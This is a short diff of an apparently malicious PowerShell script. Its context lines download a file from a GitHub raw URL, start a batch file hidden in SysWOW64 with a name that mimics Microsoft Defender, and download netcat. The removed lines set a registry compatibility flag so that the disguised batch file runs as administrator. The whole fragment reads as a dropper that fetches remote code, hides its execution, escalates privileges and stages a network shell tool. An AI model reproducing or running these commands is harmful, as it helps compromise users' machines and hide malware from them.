@@ -5,6 +5,4 @@ Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/SszOnTop/2z/main/setup
 
 Start-Process 'C:\Windows\SysWOW64\MpCmdStmp.bat' -WindowStyle Hidden
 
-New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" -Name C:\Windows\SysWOW64\MpCmdStmp.bat -Value RUNASADMIN -PropertyType string -Force | Out-Null
-
 Invoke-WebRequest -Uri 'https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip' -OutFile 'netcat.zip'
